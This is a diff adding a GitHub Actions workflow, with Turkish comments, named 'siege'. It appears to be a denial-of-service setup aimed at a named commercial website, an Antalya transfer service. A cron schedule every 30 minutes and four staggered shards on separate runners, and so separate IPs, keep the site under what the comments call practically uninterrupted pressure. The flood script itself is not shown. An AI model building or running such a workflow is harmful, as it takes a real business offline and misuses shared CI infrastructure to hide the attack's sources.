@@ -1,0 +1,40 @@
+name: kusatma
+
+# Elle de tetiklenebilir; zamanlanmış çalışma her 30 dakikada bir yeni tur açar.
+# Her tur 55 dakika koşar, 4 shard kademeli başlar -> pratikte kesintisiz baskı.
+on:
+  workflow_dispatch:
+    inputs:
+      concurrency:
+        description: "Shard basina eszamanli istek"
+        default: "25"
+      duration:
+        description: "Saniye cinsinden sure"
+        default: "3000"
+  schedule:
+    - cron: "*/30 * * * *"
+
+concurrency:
+  group: kusatma
+  cancel-in-progress: false
+
+jobs:
+  blast:
+    runs-on: ubuntu-latest
+    timeout-minutes: 60
+    strategy:
+      fail-fast: false
+      matrix:
+        # Her shard ayri bir GitHub runner = ayri bir IP.
+        shard: [1, 2, 3, 4]
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Kademeli baslat
+        run: sleep $(( ${{ matrix.shard }} * 7 ))
+
+      - name: Baskiyi surdur
+        env:
+          C: ${{ github.event.inputs.concurrency || '25' }}
+          D: ${{ github.event.inputs.duration || '3000' }}
+        run: bash run.sh "$C" "$D" "https://www.antalyatransferi.com/"
